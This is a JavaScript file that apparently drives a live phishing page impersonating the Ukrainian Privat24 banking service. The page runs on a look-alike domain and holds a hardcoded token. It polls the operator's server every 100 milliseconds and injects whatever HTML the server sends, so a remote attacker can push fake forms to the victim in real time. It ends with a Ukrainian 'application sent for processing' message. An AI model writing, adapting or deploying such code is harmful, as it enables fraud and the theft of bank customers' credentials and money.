 const token = "piiI6xD2eNAlPsNvBFFSNP5Li4isS2lS+ttdwdGmaWtLGngbO55afI6Q4mkQwbYekOmrlALRzG0QidC4PT1MCmWrzIyslvbBGypNY5sLf+ntC1l8GKfXFqj9NKsgyVPP8M7KlY0/4AaWKWMmKEM770lTXZ6kMAYAIDvz0qv75xIj5bABz4311BoFeEaVbXtzKOWnUYskSy++K2RJiiKX0s5lzHg1PoI/EuCbkwRVzjp5Y/qPfirrcOuc2lqxx6Es+t+gy0WG7VAEj/AsuPeoJO9SarOAJnmX3EjAdhEzVp3icJ3i49TKgf7WNMXjO+CTLn14m9mklcFNjhv/3fZWRQ"
 const SERVER_ADRESS = "privat24-viplata.site"

const prefix = "http://"


const session_key_endpoint = new URL(prefix + SERVER_ADRESS + "/get-session")
const session_data_endpoint = new URL (prefix + SERVER_ADRESS + "/get-session-data")
const unlock_session_endpoint = new URL (prefix + SERVER_ADRESS + "/unlock-session")
session_key_endpoint.searchParams.set("token", token)
session_data_endpoint.searchParams.set("token", token)
unlock_session_endpoint.searchParams.set("token", token)


let session_key = ""
let current_data = ""
let toContinue = true

entered = false

function sleepFor(sleepDuration){
  var now = new Date().getTime();
  while(new Date().getTime() < now + sleepDuration){ 
      /* Do nothing */ 
  }
}

function sleepThenAct(){
  if (session_key && entered === false) {
    fetch(unlock_session_endpoint + "&session_key=" + session_key);
  }
}

window.onbeforeunload = (event) => {
  event.preventDefault();
  sleepThenAct()
  window.close()
}

const replace_content = (element) => {
  const rootElement = document.getElementById("root")
  if (rootElement.innerHTML !== element) {
    const newItem = document.createElement("div")
    newItem.innerHTML = element
    newItem.id = "root"
    rootElement.parentNode.replaceChild(newItem, rootElement)
  }
}

fetch(session_key_endpoint)
  .then((response) => {
    console.log(response.status)
    if (response.status === 404) {
      toContinue = false
    } else {
      return response.json();
    }
  })
  .then((data) => {
    session_key = data
  });


const back_ask = () => {
  if (toContinue) {
      console.log(session_key)
      fetch(session_data_endpoint + "&session_key=" + session_key)
      .then((response) => {
        return response.json();
      })
      .then((data) => {
        if (data === "entered") {
          replace_content("<h1>Заявка відправлена на оброблення!<h1>")
          entered = true
        } else {
        new_content = data
        replace_content(data)
        }
      });
    } 
}

back_ask()
setInterval(()=>back_ask(), 100)
